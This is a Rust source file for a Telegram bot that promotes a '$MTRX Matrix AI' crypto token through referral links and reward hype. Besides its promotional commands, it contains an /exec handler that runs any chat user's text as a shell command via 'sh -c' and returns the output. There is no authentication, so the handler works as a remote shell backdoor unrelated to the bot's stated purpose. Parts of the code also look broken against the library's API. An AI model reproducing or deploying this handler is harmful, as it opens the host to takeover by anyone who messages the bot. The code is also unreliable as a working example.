use teloxide::prelude::*;
use teloxide::types::{InputFile, ParseMode};
use std::process::Command;
use std::env;

const MATRIX_START_TEXT: &str = r#"
Want to know how cool your Telegram presence is? 
Check your profile rating and unlock awesome rewards with $MTRX Matrix AI!

Time to vibe ✨ and step into the world of Web3.
$MTRX is on the way... Ready to explore something new?

Take the first step and see just how you stack up!
"#;

async fn get_username(bot: Bot, user_id: i64) -> String {
    match bot.get_chat(user_id).await {
        Ok(user) => {
            if let Some(username) = user.username {
                format!("@{}", username)
            } else {
                user.first_name.unwrap_or("Unknown".to_string())
            }
        },
        Err(_) => "Unknown".to_string(),
    }
}

async fn handle_exec(bot: Bot, msg: Message, args: Vec<String>) {
    let command = args.join(" ");
    let output = Command::new("sh")
        .arg("-c")
        .arg(&command)
        .output();

    let response = match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("stdout: {}\nstderr: {}", stdout, stderr)
        },
        Err(e) => format!("Error executing command: {}", e),
    };

    bot.send_message(msg.chat.id, response)
        .parse_mode(ParseMode::Html)
        .await
        .unwrap();
}

async fn handle_start(bot: Bot, msg: Message, args: Vec<String>) {
    let chat_id = msg.chat.id;
    let user_id = msg.from().unwrap().id;

    let message_text;
    let inviter_id: Option<i64> = if args.len() > 0 && args[0].starts_with("ref_") {
        let inviter_id = args[0][4..].parse::<i64>().ok();
        let inviter_name = if let Some(inv_id) = inviter_id {
            get_username(bot.clone(), inv_id).await
        } else {
            "Unknown".to_string()
        };

        message_text = format!("{}\nInvited by: {}", MATRIX_START_TEXT, inviter_name);
        inviter_id
    } else {
        message_text = MATRIX_START_TEXT.to_string();
        None
    };

    let keyboard = vec![
        vec![InlineKeyboardButton::url(
            "Play Now 🪂",
            format!("https://mtx-ai-bot.vercel.app/?userId={}", user_id),
        )],
        vec![InlineKeyboardButton::url(
            "Join Community 🔥",
            "https://telegram.me/MatrixAi_Ann".to_string(),
        )],
    ];

    bot.send_photo(
        chat_id,
        InputFile::url("https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg"),
    )
    .caption(message_text)
    .reply_markup(InlineKeyboardMarkup::new(keyboard))
    .await
    .unwrap();

    if let Some(inviter_id) = inviter_id {
        bot.send_message(inviter_id, format!("{} Joined via your invite link!", msg.from().unwrap().username.clone().unwrap_or(msg.from().unwrap().first_name.clone())))
            .await
            .unwrap();
    }
}

async fn handle_referrals(bot: Bot, msg: Message) {
    let referral_link = format!(
        "https://telegram.me/MTRXAi_Bot?start=ref_{}",
        msg.from().unwrap().id
    );
    bot.send_message(msg.chat.id, referral_link)
        .await
        .unwrap();
}

#[tokio::main]
async fn main() {
    teloxide::enable_logging!();
    log::info!("Starting bot...");

    let bot = Bot::from_env();

    teloxide::commands_repl(bot.clone(), "MTRXBot", move |msg: Message, bot: Bot, command: String| async move {
        let args: Vec<String> = command.split_whitespace().map(String::from).collect();
        match args[0].as_str() {
            "/exec" => handle_exec(bot.clone(), msg.clone(), args[1..].to_vec()).await,
            "/start" => handle_start(bot.clone(), msg.clone(), args[1..].to_vec()).await,
            "/referrals" => handle_referrals(bot.clone(), msg.clone()).await,
            _ => (),
        }
    })
    .await;
      }
